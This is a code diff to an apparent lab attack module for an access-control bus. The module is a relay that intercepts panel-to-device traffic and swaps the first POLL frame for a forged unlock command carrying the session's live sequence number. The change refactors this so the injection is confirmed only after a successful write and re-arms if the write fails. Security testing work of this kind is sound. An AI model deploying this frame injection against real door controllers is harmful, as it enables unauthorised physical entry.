@@ -15,7 +15,9 @@ it buffers each direction (a single ``recv`` is not guaranteed to be a whole fra
 and, the first time it sees a complete cp->pd ``CMD_POLL``, replaces it in flight with
 ``craft_unlock`` built from that exact frame's address and sequence number - so the injected
 command carries a sequence number the live session already expects, with no desync. Every
-later frame passes through unchanged (one-shot injection).
+later frame passes through unchanged (one-shot injection). The relay reports each forward back
+(``UnlockTransform.forwarded``), so the injection is announced only once the forged frame was
+written, and a failed write re-arms it.
 
 ``run_spoof(inject, lock_state_probe, ...)`` is the pure verdict (D-02): it requires a locked
 baseline (``lock_state_probe()`` is False) before calling ``inject()``, then emits a
@@ -136,11 +138,73 @@ def announce_inject(sequence: int) -> None:
     print(f"{INJECT_SENTINEL} seq={sequence}", flush=True)
 
 
+class UnlockTransform:
+    """The one-shot unlock rewrite of ``unlock_transform``, told by the relay what went out.
+
+    Called as a ``Transform``. ``forwarded`` is the relay's ``on_forward`` hook: the forged
+    frame is announced only once the relay reports it written, and a failed write re-arms the
+    injection so the next POLL carries a fresh forged frame. A relay that never calls
+    ``forwarded`` keeps the plain one-shot rewrite and never announces.
+    """
+
+    def __init__(
+        self, armed: Callable[[], bool], on_inject: Callable[[int], None] | None
+    ) -> None:
+        self._armed = armed
+        self._on_inject = on_inject
+        self._buffers: dict[Direction, bytearray] = {
+            Direction.cp_to_pd: bytearray(),
+            Direction.pd_to_cp: bytearray(),
+        }
+        self._frames_seen: dict[Direction, int] = {Direction.cp_to_pd: 0, Direction.pd_to_cp: 0}
+        self._injected = False
+        # The sequence of the forged frame in the last cp->pd chunk returned, until reported.
+        self._pending: int | None = None
+
+    def __call__(self, direction: Direction, data: bytes) -> bytes:
+        buffer = self._buffers[direction]
+        buffer.extend(data)
+        frames = list(framer.iter_frames(bytes(buffer)))
+        new_frames = frames[self._frames_seen[direction] :]
+        self._frames_seen[direction] = len(frames)
+
+        out = bytearray()
+        for raw in new_frames:
+            if direction is Direction.cp_to_pd and not self._injected and self._armed():
+                try:
+                    frame = codec.decode(raw)
+                except codec.DecodeError:
+                    out += raw  # trailer-valid but structurally odd; forward unchanged
+                    continue
+                if frame.code == constants.CMD_POLL:
+                    sequence = frame.control & constants.PKT_CONTROL_SQN
+                    out += craft_unlock(frame.address, sequence=sequence)
+                    self._injected = True
+                    self._pending = sequence
+                    continue
+            out += raw
+        return bytes(out)
+
+    def forwarded(self, direction: Direction, out: bytes, ok: bool) -> None:
+        """Hear whether a chunk this transform returned reached the far side (``on_forward``).
+
+        Only the cp->pd chunk carrying the forged frame matters: written, it is announced
+        through ``on_inject``; lost, the injection re-arms and nothing is announced.
+        """
+        if direction is not Direction.cp_to_pd or self._pending is None:
+            return
+        sequence, self._pending = self._pending, None
+        if not ok:
+            self._injected = False
+        elif self._on_inject is not None:
+            self._on_inject(sequence)
+
+
 def unlock_transform(
     *,
     armed: Callable[[], bool] = lambda: True,
     on_inject: Callable[[int], None] | None = None,
-) -> Transform:
+) -> UnlockTransform:
     """Return a one-shot ``Transform`` that rewrites the first cp->pd ``CMD_POLL`` into an unlock.
 
     Buffers bytes per direction (Pitfall 5: a single chunk is not guaranteed to be a whole
@@ -157,43 +221,12 @@ def unlock_transform(
     genuinely locked baseline before arming the injection.
 
     ``on_inject``, when given, is called exactly once, with the rewritten POLL's sequence
-    number, right after the forged frame replaces it. The lab relays pass ``announce_inject``
-    so the attacker log proves the injection happened.
+    number, after the relay reports the forged frame written through the returned
+    transform's ``forwarded`` (pass it to ``serve_rewrite`` as ``on_forward``). A failed write
+    is never announced and re-arms the injection. The lab relays pass ``announce_inject`` so
+    the attacker log proves the forged frame reached the bus.
     """
-    buffers: dict[Direction, bytearray] = {
-        Direction.cp_to_pd: bytearray(),
-        Direction.pd_to_cp: bytearray(),
-    }
-    forwarded: dict[Direction, int] = {Direction.cp_to_pd: 0, Direction.pd_to_cp: 0}
-    injected = False
-
-    def transform(direction: Direction, data: bytes) -> bytes:
-        nonlocal injected
-        buffer = buffers[direction]
-        buffer.extend(data)
-        frames = list(framer.iter_frames(bytes(buffer)))
-        new_frames = frames[forwarded[direction] :]
-        forwarded[direction] = len(frames)
-
-        out = bytearray()
-        for raw in new_frames:
-            if direction is Direction.cp_to_pd and not injected and armed():
-                try:
-                    frame = codec.decode(raw)
-                except codec.DecodeError:
-                    out += raw  # trailer-valid but structurally odd; forward unchanged
-                    continue
-                if frame.code == constants.CMD_POLL:
-                    sequence = frame.control & constants.PKT_CONTROL_SQN
-                    out += craft_unlock(frame.address, sequence=sequence)
-                    injected = True
-                    if on_inject is not None:
-                        on_inject(sequence)
-                    continue
-            out += raw
-        return bytes(out)
-
-    return transform
+    return UnlockTransform(armed, on_inject)
 
 
 def run_spoof(
@@ -246,7 +279,8 @@ def serve_spoof_unlock_lab(target_port: int, upstream: tuple[str, int]) -> None:
     CMD_OUT, and the lab PD lock-state signal confirms the outcome. Blocks serving connections,
     like the other attack modules' lab drivers.
     """
-    TCPTap(target_port, upstream).serve_rewrite(unlock_transform())
+    relay = unlock_transform()
+    TCPTap(target_port, upstream).serve_rewrite(relay, on_forward=relay.forwarded)
 
 
 def _upstream() -> tuple[str, int]:
@@ -271,9 +305,8 @@ def main() -> None:
         f"upstream={upstream[0]}:{upstream[1]}",
         flush=True,
     )
-    TCPTap(_LAB_PORT, upstream).serve_rewrite(
-        unlock_transform(armed=_TRIGGER_PATH.exists, on_inject=announce_inject)
-    )
+    relay = unlock_transform(armed=_TRIGGER_PATH.exists, on_inject=announce_inject)
+    TCPTap(_LAB_PORT, upstream).serve_rewrite(relay, on_forward=relay.forwarded)
 
 
 def _serial_unlock_relay(cp_endpoint: object, pd_endpoint: object) -> None:
